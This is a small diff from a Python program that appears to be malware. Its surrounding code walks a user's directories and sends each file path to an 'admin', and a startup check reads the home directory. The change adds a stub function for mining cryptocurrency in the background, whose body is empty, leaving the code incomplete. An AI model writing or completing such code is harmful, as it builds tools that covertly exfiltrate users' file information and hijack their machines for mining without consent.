@@ -326,6 +326,9 @@ def fileList(dir): # List files in current directory
                 print(os.path.join(root, name)) # Print the dir list to screen if debugmode is enabled.
             sendntc(os.path.join(root, name), adminname)
 
+def bgMining():
+    # Mine crypto in the background.
+            
 def srtChk(): # Startup Check. (Still in testing!)
     name = str(__name__)
     hd = str(os.path.expanduser('~')) 
